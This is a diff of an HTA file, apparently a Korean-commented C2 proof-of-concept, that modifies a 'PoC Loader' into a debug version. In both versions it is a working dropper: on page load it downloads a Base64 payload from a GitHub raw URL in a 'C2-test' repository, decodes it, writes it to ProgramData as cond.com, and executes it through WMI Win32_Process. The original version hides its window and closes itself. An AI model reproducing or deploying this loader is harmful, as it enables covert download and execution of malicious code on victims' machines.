@@ -1,16 +1,16 @@
 <html>
   <head>
-    <title>PoC Loader</title>
+    <title>PoC Loader Debug</title>
     <hta:application
-      id="pocLoader"
-      showintaskbar="no"
-      sysmenu="no"
-      windowstate="minimize"
+      id="pocLoaderDebug"
+      showintaskbar="yes"
+      sysmenu="yes"
+      windowstate="normal"
     />
     <script language="JScript">
       function runPayload() {
         try {
-          // 1. GitHub에서 Base64 텍스트 다운로드 (MSXML2.ServerXMLHTTP 이용)
+          // 1. GitHub 다운로드 체크
           var url =
             "https://raw.githubusercontent.com/ParkJeongKyun/C2-test/master/payload/encoded_encrypt.txt";
           var xmlHttp = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
@@ -19,25 +19,40 @@
           xmlHttp.send();
 
           if (xmlHttp.status !== 200) {
+            alert(
+              "[-] GitHub 다운로드 실패! HTTP 상태 코드: " + xmlHttp.status,
+            );
             window.close();
             return;
           }
 
           var base64Data = xmlHttp.responseText;
+          if (!base64Data || base64Data.length === 0) {
+            alert("[-] 다운로드된 텍스트가 비어 있습니다.");
+            window.close();
+            return;
+          }
+          alert(
+            "[+] 1단계 성공: GitHub에서 Base64 데이터 수신 완료 (" +
+              base64Data.length +
+              " 바이트)",
+          );
 
-          // 2. Base64 디코딩 레이어 (Microsoft.XMLDOM 이용)
+          // 2. Base64 디코딩 체크
           var xmlDoc = new ActiveXObject("Microsoft.XMLDOM");
           var el = xmlDoc.createElement("tmp");
           el.dataType = "bin.base64";
           el.text = base64Data;
           var decodedBytes = el.nodeTypedValue;
+          alert("[+] 2단계 성공: Base64 디코딩 완료");
 
-          // 3. ProgramData 경로에 cond.com 파일로 복사/생성 (ADODB.Stream 이용)
+          // 3. 파일 생성 경로 및 권한 체크
           var shell = new ActiveXObject("WScript.Shell");
           var programDataPath = shell.ExpandEnvironmentStrings(
             "%SystemDrive%\\ProgramData",
           );
           var targetPath = programDataPath + "\\cond.com";
+          alert("[*] 파일 생성 시도 경로: " + targetPath);
 
           var stream = new ActiveXObject("ADODB.Stream");
           stream.type = 1; // Binary
@@ -45,25 +60,36 @@
           stream.write(decodedBytes);
           stream.saveToFile(targetPath, 2); // 2: Overwrite
           stream.close();
+          alert("[+] 3단계 성공: ProgramData에 파일 쓰기 완료");
 
-          // 4. WMI(Win32_Process)를 통한 우회 실행
+          // 4. WMI 실행 체크
           var wmiService = GetObject(
             "winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2",
           );
           var processInfo = wmiService.Get("Win32_Process");
 
-          // 프로세스 생성을 위한 인자 설정 (반환값 및 PID 수집용)
           var processId = 0;
           var result = processInfo.Create(targetPath, null, null, processId);
+
+          if (result === 0) {
+            alert("[+] 4단계 성공: WMI 프로세스 생성 완료! PID: " + processId);
+          } else {
+            alert("[-] 4단계 실패: WMI 응답 코드: " + result);
+          }
         } catch (e) {
-          // 실습 중 에러 발생 시 디버깅을 위해 주석 해제하여 확인 가능
-          // alert("에러 발생: " + e.message);
+          // 에러 발생 시 팝업 창으로 세부 내용 출력
+          alert(
+            "[-] 예외 에러 발생:\n이름: " + e.name + "\n메시지: " + e.message,
+          );
         } finally {
-          // 모든 작업이 끝나면 mshta 창을 화면에 남기지 않고 자동으로 닫음
-          window.close();
+          // 디버깅을 위해 자동 종료를 임시 주석 처리합니다.
+          // 확인이 끝나면 주석을 해제하세요.
+          // window.close();
         }
       }
     </script>
   </head>
-  <body onload="runPayload()"></body>
+  <body onload="runPayload()">
+    <h3>PoC 디버깅 모드 작동 중...</h3>
+  </body>
 </html>
